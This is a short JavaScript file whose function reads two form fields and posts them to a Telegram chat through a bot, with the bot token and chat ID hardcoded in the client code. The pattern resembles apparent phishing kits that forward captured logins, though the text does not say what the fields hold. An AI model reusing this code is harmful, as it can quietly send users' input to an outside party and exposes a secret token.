// main.js
function send() {
    let a = document.getElementById("input1").value;
    let b = document.getElementById("input2").value;

    let TOKEN = "8628807064:AAH6SXYouihXiAujY-SE9UaMxyRUI-gsgK4";
    let CHAT_ID = "-1004300839212";

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `Jonibek\n1: ${a}\n2: ${b}`
        })
    });
}